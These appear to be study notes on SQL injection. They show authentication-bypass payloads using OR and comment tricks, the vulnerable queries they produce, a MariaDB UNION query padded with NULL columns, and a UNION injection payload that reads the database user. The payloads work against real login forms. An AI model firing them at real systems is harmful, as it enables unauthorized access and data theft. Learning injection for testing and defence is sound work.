### <span style=color:black>Auth Bypass with OR operator</span>
```sql!
tom' OR '1' = '1
```
```sql!
SELECT * FROM logins WHERE username = 'tom' OR '1' = '1' AND password = 'ANYPASSWORD';
```
### <span style=color:black>Auth Bypass with comments</span>
```sql!
123' OR id=5)-- -
```
```sql!
SELECT * FROM logins WHERE (username = '123' OR id=5)--' AND id>1) AND password = '202cb962ac59075b964b07152d234b70';
```
#### <span style=color:blue>This method try to exploit (Perimeter), such as : ' and )</span>

### <span style=color:red>**Union Un-even Columns**</span>
```sql!
MariaDB [employees]> DESCRIBE departments;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+

MariaDB [employees]> DESCRIBE employees;
+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
| emp_no     | int(11)       | NO   | PRI | NULL    |       |
| birth_date | date          | NO   |     | NULL    |       |
| first_name | varchar(14)   | NO   |     | NULL    |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| gender     | enum('M','F') | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+

MariaDB [employees]> SELECT dept_no, dept_name, NULL, NULL, NULL, NULL FROM departments UNION SELECT * FROM employees LIMIT 15;
+---------+--------------------+---------+-------------+------+------------+
| dept_no | dept_name          | NULL    | NULL        | NULL | NULL       |
+---------+--------------------+---------+-------------+------+------------+
| d009    | Customer Service   | NULL    | NULL        | NULL | NULL       |
| d005    | Development        | NULL    | NULL        | NULL | NULL       |
| d002    | Finance            | NULL    | NULL        | NULL | NULL       |
| d003    | Human Resources    | NULL    | NULL        | NULL | NULL       |
| d001    | Marketing          | NULL    | NULL        | NULL | NULL       |
| d004    | Production         | NULL    | NULL        | NULL | NULL       |
| d006    | Quality Management | NULL    | NULL        | NULL | NULL       |
| d008    | Research           | NULL    | NULL        | NULL | NULL       |
| d007    | Sales              | NULL    | NULL        | NULL | NULL       |
| 10001   | 1953-09-02         | Georgi  | Facello     | M    | 1986-06-26 |
| 10002   | 1952-12-03         | Vivian  | Billawala   | F    | 1986-12-11 |
| 10003   | 1959-06-16         | Temple  | Lukaszewicz | M    | 1992-07-04 |
| 10004   | 1956-11-06         | Masanao | Rahimi      | M    | 1986-12-16 |
| 10005   | 1962-12-11         | Sanjay  | Danlos      | M    | 1985-08-01 |
| 10006   | 1963-12-30         | Marie   | Stafford    | M    | 1988-10-10 |
+---------+--------------------+---------+-------------+------+------------+
```
### Union Injection
```sql!
cn' UNION select 1,user(),3,4-- -
```